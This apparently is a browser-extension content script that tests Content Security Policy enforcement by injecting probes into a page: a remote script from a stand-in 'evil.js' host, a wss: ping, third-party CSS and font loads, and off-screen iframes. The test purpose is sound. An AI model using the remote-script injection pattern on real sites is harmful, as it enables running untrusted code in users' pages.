(() => {
  const marker = "csp-trigger-extension-installed";
  if (document.documentElement.hasAttribute(marker)) {
    return;
  }
  document.documentElement.setAttribute(marker, "1");

  let panel = null;
  const status = [];
  const pushStatus = (msg) => {
    status.push(msg);
    if (panel) {
      panel.textContent = ["CSP Trigger Extension Active"].concat(status).join("\n");
    }
    console.log("[csp-trigger]", msg);
  };

  // Trigger script-src violation: policy uses strict-dynamic + nonce, so this
  // third-party script without nonce/hash should be blocked by CSP.
  const injectedScript = document.createElement("script");
  injectedScript.src = "https://example.com/evil.js";
  injectedScript.setAttribute("data-csp-trigger", "script-strict-dynamic");
  injectedScript.addEventListener("error", () => pushStatus("script-src probe: error event"));
  injectedScript.addEventListener("load", () => pushStatus("script-src probe: load event"));
  document.head.appendChild(injectedScript);
  pushStatus("script-src probe appended (https://example.com/evil.js)");

  // Load a real third-party stylesheet URL provided for testing.
  const cssUrl = "https://g.alicdn.com/code/npm/@ali/pegasus-project-tbhome-2024/1.11.10/css/main.css";
  const injectedCss = document.createElement("link");
  injectedCss.rel = "stylesheet";
  injectedCss.href = cssUrl;
  injectedCss.setAttribute("data-csp-trigger", "style-alicdn");
  injectedCss.addEventListener("error", () => pushStatus("style probe: error event"));
  injectedCss.addEventListener("load", () => pushStatus("style probe: load event"));
  document.head.appendChild(injectedCss);
  pushStatus("style probe appended (" + cssUrl + ")");

  // Trigger connect-src violation by sending a ping request to a non-http(s)
  // scheme; current policy only allows https: and http: for connect-src.
  const pingAnchor = document.createElement("a");
  pingAnchor.href = "#";
  pingAnchor.ping = "wss://example.com/ping";
  pingAnchor.rel = "noreferrer";
  pingAnchor.textContent = "csp-connect-probe";
  pingAnchor.style.display = "none";
  pingAnchor.setAttribute("data-csp-trigger", "connect-ping-wss");
  document.body.appendChild(pingAnchor);
  pingAnchor.click();
  pushStatus("connect-src probe clicked (ping=wss://example.com/ping)");

  // Load a real third-party font URL provided for testing.
  const fontUrl = "https://at.alicdn.com/t/a/font_403341_z4ofl26w68.woff2?t=1750744474570";
  const fontStyle = document.createElement("style");
  fontStyle.setAttribute("data-csp-trigger", "font-alicdn");
  fontStyle.textContent = `
    @font-face {
      font-family: "CspBlobFont";
      src: url("${fontUrl}") format("woff2");
      font-display: swap;
    }
    body {
      font-family: "CspBlobFont", sans-serif !important;
    }
  `;
  document.head.appendChild(fontStyle);
  pushStatus("font-src probe appended (" + fontUrl + ")");

  // Trigger frame/default-src violation and expose load/error events for debug.
  const makeFrameProbe = (src, name) => {
    const f = document.createElement("iframe");
    f.src = src;
    f.width = "1";
    f.height = "1";
    f.style.border = "0";
    f.style.position = "fixed";
    f.style.left = "-9999px";
    f.setAttribute("data-csp-trigger", name);
    f.addEventListener("error", () => pushStatus(name + ": error event"));
    f.addEventListener("load", () => pushStatus(name + ": load event"));
    document.body.appendChild(f);
    pushStatus(name + " appended (" + src + ")");
  };

  makeFrameProbe("https://example.com/", "frame-probe-cross-origin");
  makeFrameProbe("data:text/html,<h1>frame-probe</h1>", "frame-probe-data-scheme");

  // Visible marker so you know extension code ran.
  panel = document.createElement("div");
  panel.textContent = "CSP Trigger Extension Active";
  panel.style.cssText = [
    "position:fixed",
    "right:12px",
    "bottom:12px",
    "z-index:2147483647",
    "background:#111",
    "color:#fff",
    "padding:6px 10px",
    "font:12px/1.2 monospace",
    "border-radius:4px",
    "opacity:0.9",
    "white-space:pre-line",
    "max-width:360px"
  ].join(";");
  panel.textContent = ["CSP Trigger Extension Active"].concat(status).join("\n");
  document.body.appendChild(panel);
})();
